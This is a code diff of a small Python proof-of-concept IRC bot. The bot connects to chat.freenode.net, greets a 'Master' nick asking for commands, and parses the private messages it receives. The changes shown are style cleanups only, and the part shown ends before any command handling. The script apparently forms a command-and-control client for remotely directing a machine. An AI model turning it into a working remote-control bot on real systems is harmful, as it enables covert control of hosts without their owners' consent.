@@ -1,16 +1,14 @@
 #!/usr/bin/env python3
 
 # This is just a PoC, and it comes with no warranty or anything.
-# Use it at your own risk. it MUST NOT be used in a production environment or anything other than testing. 
+# Use it at your own risk. it MUST NOT be used in a production environment or anything other than testing.
 # PLEASE respect other people's privacy. Only tested on Linux BTW
 
 import os
 import socket
-import string
-import sys
 import time
 
-HOST = "chat.freenode.net" # You can change this to whatever you want
+HOST = "chat.freenode.net"  # You can change this to whatever you want
 PORT = 6667
 
 NICK = "Your Nick Name"
@@ -35,7 +33,7 @@ s.send(bytes("PRIVMSG %s :Hello Master :) Tell me commands to do \r\n" % MASTER,
 
 # TODO: Error handling and freeze detection
 while True:
-    readbuffer = readbuffer+s.recv(1024).decode("UTF-8")
+    readbuffer = readbuffer + s.recv(1024).decode("UTF-8")
     temp = str.split(readbuffer, "\n")
     readbuffer = temp.pop()
 
@@ -43,19 +41,19 @@ while True:
         line = str.rstrip(line)
         line = str.split(line)
 
-        if(line[0] == "PING"):
+        if line[0] == "PING":
             s.send(bytes("PONG %s\r\n" % line[1], "UTF-8"))
-        if(line[1] == "PRIVMSG"):
+        if line[1] == "PRIVMSG":
             sender = ""
             for char in line[0]:
-                if(char == "!"):
+                if char == "!":
                     break
-                if(char != ":"):
+                if char != ":":
                     sender += char
             size = len(line)
             i = 3
             message = ""
-            while(i < size):
+            while i < size:
                 message += line[i] + " "
                 i = i + 1
             message.lstrip(":")
